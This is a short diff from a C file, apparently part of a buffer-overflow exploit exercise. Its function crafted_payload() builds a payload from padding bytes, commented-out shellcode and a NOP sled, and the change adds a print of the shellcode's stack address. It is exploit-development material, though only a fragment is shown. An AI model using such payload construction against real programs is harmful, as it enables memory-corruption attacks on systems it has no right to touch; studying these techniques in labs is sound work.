@@ -38,6 +38,9 @@ char* crafted_payload(){
 	//char shellcode[] = "\x41";
 	//printf("%ld\n", strlen(shellcode));
 
+	printf("%p\n", (void*)shellcode);
+	//0x7fffffffdb60
+
 	// Padding de bp
 	//char padding_bp [] = "\x90\x90\x90\x90\x90\x90\x90\x90";
 	char padding_bp [] = "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";
